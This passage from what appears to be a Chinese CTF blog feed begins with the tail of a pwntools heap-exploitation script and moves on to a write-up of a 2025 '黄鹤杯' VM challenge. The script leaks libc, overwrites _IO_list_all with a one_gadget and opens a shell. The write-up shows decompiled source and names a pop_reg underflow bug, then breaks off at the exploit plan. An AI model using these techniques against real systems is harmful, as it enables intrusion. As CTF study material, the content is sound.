class="number">0x2a0</span></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x500</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x601</span>) + p64(forged_fd)*<span class="number">2</span>)</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">9</span>):</span><br><span class="line">    add(i, <span class="number">0xf8</span>, <span class="string">b&#x27;A&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">9</span>, <span class="number">0xf0</span>, <span class="string">b&#x27;B&#x27;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>, <span class="number">0xf8</span>, <span class="string">b&quot;C&quot;</span>*(<span class="number">0xf0</span>) + p64(<span class="number">0x600</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>, <span class="number">10</span>):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">9</span>, <span class="number">0x4f0</span>, <span class="string">b&quot;D&quot;</span>*<span class="number">8</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x21ace0</span></span><br><span class="line">log.success(<span class="string">f&quot;libc base: <span class="subst">&#123;<span class="built_in">hex</span>(libc_base)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># step 4 get shell</span></span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line">add(<span class="number">8</span>, <span class="number">0x1f0</span>, <span class="string">b&quot;E&quot;</span>*<span class="number">8</span>)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">tkey = heap_base &gt;&gt; <span class="number">12</span></span><br><span class="line">head = <span class="string">b&quot;F&quot;</span> * (<span class="number">0x300</span> - <span class="number">0x10</span>)  <span class="comment"># 0x2f0</span></span><br><span class="line">hdr = p64(<span class="number">0x510</span>) + p64(<span class="number">0x201</span>) + p64((heap_base + <span class="number">0x10</span>) ^ tkey)</span><br><span class="line">forged = head + hdr</span><br><span class="line"></span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x4f0</span>, forged)</span><br><span class="line"></span><br><span class="line">_IO_list_all = libc_base + <span class="number">0x21a090</span></span><br><span class="line">one_gadget = libc_base + <span class="number">0xEBC85</span></span><br><span class="line"></span><br><span class="line">pay_links = (p16(<span class="number">7</span>) * <span class="number">0x40</span>) + p64(_IO_list_all) * <span class="number">4</span></span><br><span class="line">add(<span class="number">4</span>, <span class="number">0x1f0</span>, <span class="string">b&quot;G&quot;</span>)  <span class="comment"># padding</span></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">add(<span class="number">5</span>, <span class="number">0x1f0</span>, pay_links)</span><br><span class="line"></span><br><span class="line">add(<span class="number">6</span>, <span class="number">0x20</span>, p64(one_gadget)*<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
          <category> heap </category>
          
          <category> libc-got </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>黄鹤杯2025</title>
      <link href="/2025/10/09/%E9%BB%84%E9%B9%A4%E6%9D%AF2025/"/>
      <url>/2025/10/09/%E9%BB%84%E9%B9%A4%E6%9D%AF2025/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>黄鹤杯也是光荣爆0，师傅们都卡在同一步了（悲）<br>拖到现在复现了一下</p><h2 id="0x01-题目分析"><a href="#0x01-题目分析" class="headerlink" title="0x01 题目分析"></a>0x01 题目分析</h2><p>逆向后的源码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> n1131796; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">int</span> instruction_pointer; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  n1131796 = <span class="number">0</span>;</span><br><span class="line">  init_vm();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please input your op:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, vm_context-&gt;instruction_buffer, <span class="number">0x100u</span>LL);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    instruction_pointer = vm_context-&gt;instruction_pointer;</span><br><span class="line">    vm_context-&gt;instruction_pointer = instruction_pointer + <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">switch</span> ( *((_BYTE *)vm_context-&gt;instruction_buffer + instruction_pointer) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        ((<span class="type">void</span> (__fastcall *)(_QWORD))vm_context-&gt;op_table-&gt;op_push_reg)((<span class="type">unsigned</span> <span class="type">int</span>)*((<span class="type">char</span> *)vm_context-&gt;instruction_buffer</span><br><span class="line">                                                                                       + instruction_pointer</span><br><span class="line">                                                                                       + <span class="number">1</span>));</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;op 0x1 executed&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        ((<span class="type">void</span> (__fastcall *)(_QWORD))vm_context-&gt;op_table-&gt;op_push_imm)(*(<span class="type">unsigned</span> <span class="type">int</span> *)((<span class="type">char</span> *)vm_context-&gt;instruction_buffer</span><br><span class="line">                                                                                         + instruction_pointer</span><br><span class="line">                                                                                         + <span class="number">1</span>));</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;op 0x2 executed&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        ((<span class="type">void</span> (__fastcall *)(_QWORD))vm_context-&gt;op_table-&gt;op_pop_reg)((<span class="type">unsigned</span> <span class="type">int</span>)*((<span class="type">char</span> *)vm_context-&gt;instruction_buffer</span><br><span class="line">                                                                                      + instruction_pointer</span><br><span class="line">                                                                                      + <span class="number">1</span>));</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;op 0x3 executed&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        vm_context-&gt;op_table-&gt;op_add_reg(</span><br><span class="line">          *((<span class="type">char</span> *)vm_context-&gt;instruction_buffer + instruction_pointer + <span class="number">1</span>),</span><br><span class="line">          *((<span class="type">char</span> *)vm_context-&gt;instruction_buffer + instruction_pointer + <span class="number">2</span>),</span><br><span class="line">          *((<span class="type">char</span> *)vm_context-&gt;instruction_buffer + instruction_pointer + <span class="number">3</span>));</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;op 0x4 executed&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        vm_context-&gt;op_table-&gt;op_sub_reg(</span><br><span class="line">          *((<span class="type">char</span> *)vm_context-&gt;instruction_buffer + instruction_pointer + <span class="number">1</span>),</span><br><span class="line">          *((<span class="type">char</span> *)vm_context-&gt;instruction_buffer + instruction_pointer + <span class="number">2</span>),</span><br><span class="line">          *((<span class="type">char</span> *)vm_context-&gt;instruction_buffer + instruction_pointer + <span class="number">3</span>));</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;op 0x5 executed&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">        vm_context-&gt;op_table-&gt;op_mul_reg(</span><br><span class="line">          *((<span class="type">char</span> *)vm_context-&gt;instruction_buffer + instruction_pointer + <span class="number">1</span>),</span><br><span class="line">          *((<span class="type">char</span> *)vm_context-&gt;instruction_buffer + instruction_pointer + <span class="number">2</span>),</span><br><span class="line">          *((<span class="type">char</span> *)vm_context-&gt;instruction_buffer + instruction_pointer + <span class="number">3</span>));</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;op 0x6 executed&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">        ((<span class="type">void</span> (__fastcall *)(_QWORD, _QWORD, _QWORD))vm_context-&gt;op_table-&gt;op_store_data)(</span><br><span class="line">          (<span class="type">unsigned</span> <span class="type">int</span>)*((<span class="type">char</span> *)vm_context-&gt;instruction_buffer + instruction_pointer + <span class="number">1</span>),</span><br><span class="line">          (<span class="type">unsigned</span> <span class="type">int</span>)*((<span class="type">char</span> *)vm_context-&gt;instruction_buffer + instruction_pointer + <span class="number">2</span>),</span><br><span class="line">          (<span class="type">unsigned</span> <span class="type">int</span>)*((<span class="type">char</span> *)vm_context-&gt;instruction_buffer + instruction_pointer + <span class="number">3</span>));</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;op 0x7 executed&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">        ((<span class="type">void</span> (__fastcall *)(_QWORD))vm_context-&gt;op_table-&gt;op_print_data)((<span class="type">unsigned</span> <span class="type">int</span>)*(__int16 *)((<span class="type">char</span> *)vm_context-&gt;instruction_buffer + instruction_pointer + <span class="number">1</span>));</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;op 0x8 executed&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">9</span>:</span><br><span class="line">        <span class="keyword">if</span> ( n1131796 )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;You can not use this op.&quot;</span>);</span><br><span class="line">          _exit(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        read(<span class="number">0</span>, (<span class="type">char</span> *)vm_context-&gt;instruction_buffer + instruction_pointer + <span class="number">5</span>, <span class="number">0x100u</span>LL);</span><br><span class="line">        *((_BYTE *)vm_context-&gt;instruction_buffer + instruction_pointer + <span class="number">25</span>) = <span class="number">0</span>;</span><br><span class="line">        n1131796 = <span class="number">1131796</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        _exit(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关键漏洞在于</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">op_pop_reg</span><span class="params">(<span class="type">unsigned</span> __int8 n4)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( vm_context-&gt;stack_pointer &gt; <span class="number">511</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Stack error.&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( n4 &gt;= <span class="number">4u</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Wrong reg index.&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  vm_context-&gt;registers[(<span class="type">char</span>)n4] = *((_DWORD *)vm_context-&gt;stack_area + --vm_context-&gt;stack_pointer);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>pop_reg</code>存在负溢出</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">op_store_data</span><span class="params">(<span class="type">char</span> a1, <span class="type">unsigned</span> __int8 n4, <span class="type">unsigned</span> __int16 n0x200)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a1 != <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Please check your opcode!&quot;</span>);</span><br><span class="line">      _exit(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;To be developed...&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( n4 &gt;= <span class="number">4u</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Wrong reg index.&quot;</span>);</span><br><span class="line">      _exit(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( n0x200 &gt;= <span class="number">0x200u</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Wrong data index.&quot;</span>);</span><br><span class="line">      _exit(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    *((_DWORD *)vm_context-&gt;data_area + (__int16)n0x200) = encrypt_data(vm_context-&gt;registers[(<span class="type">char</span>)n4]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">init_vm</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v1; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">void</span> *v3; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line">  <span class="type">void</span> *v4; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  init_seccomp();</span><br><span class="line">  opcode_table = (__int64)<span class="built_in">malloc</span>(<span class="number">0x40u</span>LL);</span><br><span class="line">  *(_QWORD *)opcode_table = op_push_reg;</span><br><span class="line">  *(_QWORD *)(opcode_table + <span class="number">8</span>) = op_push_imm;</span><br><span class="line">  *(_QWORD *)(opcode_table + <span class="number">16</span>) = op_pop_reg;</span><br><span class="line">  *(_QWORD *)(opcode_table + <span class="number">24</span>) = op_add_reg;</span><br><span class="line">  *(_QWORD *)(opcode_table + <span class="number">32</span>) = op_sub_reg;</span><br><span class="line">  *(_QWORD *)(opcode_table + <span class="number">40</span>) = op_mul_reg;</span><br><span class="line">  *(_QWORD *)(opcode_table + <span class="number">48</span>) = op_store_data;</span><br><span class="line">  *(_QWORD *)(opcode_table + <span class="number">56</span>) = op_print_data;</span><br><span class="line">  v3 = <span class="built_in">malloc</span>(<span class="number">0x1000u</span>LL);</span><br><span class="line">  v4 = mmap(<span class="number">0LL</span>, <span class="number">0x1000u</span>LL, <span class="number">7</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">  vm_context = (__int64)<span class="built_in">malloc</span>(<span class="number">0x30u</span>LL);</span><br><span class="line">  *(_QWORD *)vm_context = opcode_table;</span><br><span class="line">  *(_DWORD *)(vm_context + <span class="number">12</span>) = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)(vm_context + <span class="number">8</span>) = <span class="number">0</span>;</span><br><span class="line">  *(_QWORD *)(vm_context + <span class="number">16</span>) = v3;</span><br><span class="line">  v0 = vm_context;</span><br><span class="line">  *(_QWORD *)(v0 + <span class="number">24</span>) = <span class="built_in">malloc</span>(<span class="number">0x10u</span>LL);</span><br><span class="line">  *(_QWORD *)(vm_context + <span class="number">32</span>) = v4;</span><br><span class="line">  v1 = vm_context;</span><br><span class="line">  *(_QWORD *)(v1 + <span class="number">40</span>) = <span class="built_in">malloc</span>(<span class="number">0x1000u</span>LL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">00000000</span> <span class="class"><span class="keyword">struct</span> $2<span class="title">B563B03FB91503FE1E405F06C4B0C26</span> // <span class="title">sizeof</span>=</span><span class="number">0x40</span></span><br><span class="line"><span class="number">00000000</span> &#123;                                       <span class="comment">// XREF: opcode_table_t/r</span></span><br><span class="line"><span class="number">00000000</span>     <span class="type">void</span> *op_push_reg;</span><br><span class="line"><span class="number">00000008</span>     <span class="type">void</span> *op_push_imm;</span><br><span class="line"><span class="number">00000010</span>     <span class="type">void</span> *op_pop_reg;</span><br><span class="line"><span class="number">00000018</span>     __int64 (__fastcall *op_add_reg)(<span class="type">unsigned</span> __int8 n4, <span class="type">unsigned</span> __int8 n4_1, <span class="type">unsigned</span> __int8 n4);</span><br><span class="line"><span class="number">00000020</span>     __int64 (__fastcall *op_sub_reg)(<span class="type">unsigned</span> __int8 n4, <span class="type">unsigned</span> __int8 n4_1, <span class="type">unsigned</span> __int8 n4);</span><br><span class="line"><span class="number">00000028</span>     __int64 (__fastcall *op_mul_reg)(<span class="type">unsigned</span> __int8 n4, <span class="type">char</span> n3, <span class="type">unsigned</span> __int8 n4);</span><br><span class="line"><span class="number">00000030</span>     <span class="type">void</span> *op_store_data;</span><br><span class="line"><span class="number">00000038</span>     <span class="type">void</span> *op_print_data;</span><br><span class="line"><span class="number">00000040</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="number">00000000</span> <span class="class"><span class="keyword">struct</span> $2<span class="title">A613AA1E1BF23EE4E8D96AF38ED70B3</span> // <span class="title">sizeof</span>=</span><span class="number">0x30</span></span><br><span class="line"><span class="number">00000000</span> &#123;                                       <span class="comment">// XREF: vm_context_t/r</span></span><br><span class="line"><span class="number">00000000</span>     <span class="type">opcode_table_t</span> *op_table;</span><br><span class="line"><span class="number">00000008</span>     <span class="type">int</span> stack_pointer;</span><br><span class="line"><span class="number">0000000</span>C     <span class="type">int</span> instruction_pointer;</span><br><span class="line"><span class="number">00000010</span>     <span class="type">void</span> *stack_area;</span><br><span class="line"><span class="number">00000018</span>     <span class="type">int</span> *registers;</span><br><span class="line"><span class="number">00000020</span>     <span class="type">void</span> *data_area;</span><br><span class="line"><span class="number">00000028</span>     <span class="type">void</span> *instruction_buffer;</span><br><span class="line"><span class="number">00000030</span> &#125;;</span><br></pre></td></tr></table></figure><p>虚拟栈和函数表都在堆上，虚拟数据区域在<code>mmap</code>出的地址<br>这里<code>store</code>时候存在一个加密函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">_int64 __fastcall <span class="title function_">encrypt_data</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v2; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// edi</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// [rsp+0h] [rbp-14h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+10h] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __ROL4__(a1, <span class="number">11</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">16</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = ((((((v5 ^ (v5 &gt;&gt; <span class="number">17</span>)) &lt;&lt; <span class="number">19</span>) &amp; <span class="number">0xDEADBEEF</span> ^ v5 ^ (v5 &gt;&gt; <span class="number">17</span>)) &lt;&lt; <span class="number">29</span>) &amp; <span class="number">0xB14CB12D</span> ^ ((v5 ^ (v5 &gt;&gt; <span class="number">17</span>)) &lt;&lt; <span class="number">19</span>) &amp; <span class="number">0xDEADBEEF</span> ^ v5 ^ (v5 &gt;&gt; <span class="number">17</span>) ^ ((((v5 ^ (v5 &gt;&gt; <span class="number">17</span>)) &lt;&lt; <span class="number">19</span>) &amp; <span class="number">0xDEADBEEF</span> ^ v5 ^ (v5 &gt;&gt; <span class="number">17</span>) ^ ((((v5 ^ (v5 &gt;&gt; <span class="number">17</span>)) &lt;&lt; <span class="number">19</span>) &amp; <span class="number">0xDEADBEEF</span> ^ v5 ^ (v5 &gt;&gt; <span class="number">17</span>)) &lt;&lt; <span class="number">29</span>) &amp; <span class="number">0xB14CB12D</span>) &gt;&gt; <span class="number">25</span>)) &gt;&gt; <span class="number">13</span>) ^ ((((v5 ^ (v5 &gt;&gt; <span class="number">17</span>)) &lt;&lt; <span class="number">19</span>) &amp; <span class="number">0xDEADBEEF</span> ^ v5 ^ (v5 &gt;&gt; <span class="number">17</span>) ^ ((((v5 ^ (v5 &gt;&gt; <span class="number">17</span>)) &lt;&lt; <span class="number">19</span>) &amp; <span class="number">0xDEADBEEF</span> ^ v5 ^ (v5 &gt;&gt; <span class="number">17</span>)) &lt;&lt; <span class="number">29</span>) &amp; <span class="number">0xB14CB12D</span>) &gt;&gt; <span class="number">25</span>) ^ ((((v5 ^ (v5 &gt;&gt; <span class="number">17</span>)) &lt;&lt; <span class="number">19</span>) &amp; <span class="number">0xDEADBEEF</span> ^ v5 ^ (v5 &gt;&gt; <span class="number">17</span>)) &lt;&lt; <span class="number">29</span>) &amp; <span class="number">0xB14CB12D</span> ^ ((v5 ^ (v5 &gt;&gt; <span class="number">17</span>)) &lt;&lt; <span class="number">19</span>) &amp; <span class="number">0xDEADBEEF</span> ^ v5 ^ (v5 &gt;&gt; <span class="number">17</span>);</span><br><span class="line">    v2 = v1;</span><br><span class="line">    v3 = v1;</span><br><span class="line">    v5 = ((v2 ^ (v2 &gt;&gt; <span class="number">15</span>)) &lt;&lt; <span class="number">17</span>) &amp; <span class="number">0xDEADBEEF</span> ^ (v1 &gt;&gt; <span class="number">15</span>) ^ v1 ^ (((v1 &gt;&gt; <span class="number">15</span>) ^ v2 ^ ((v3 ^ (v3 &gt;&gt; <span class="number">15</span>)) &lt;&lt; <span class="number">17</span>) &amp; <span class="number">0xDEADBEEF</span>) &lt;&lt; <span class="number">20</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)__ROR4__(v5, <span class="number">15</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>存在输出</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">op_print_data</span><span class="params">(<span class="type">unsigned</span> __int16 n0x200)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( n0x200 &gt;= <span class="number">0x200u</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Wrong data index.&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;data in offset %d is %x\n&quot;</span>, (__int16)n0x200, *((_DWORD *)vm_context-&gt;data_area + (__int16)n0x200));</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>想要结合<code>pop_reg</code>负溢出来利用<code>print_data</code>和<code>store</code>进行<code>leak</code>和<code>overwrite</code>的话需要破解这个加密函数<br>直接用@powchan学长调教gpt成功破解得到的加解密函数了，看着就头大</p><h2 id="0x02-思路"><a href="#0x02-思路" class="headerlink" title="0x02  思路"></a>0x02  思路</h2><p><code>pop_reg</code>负溢出可以控制虚拟栈之前的数据，可以结合<code>print_data</code>泄露地址以及<code>push_imm</code>覆写 <code>vm</code> 的 <code>vtable</code> 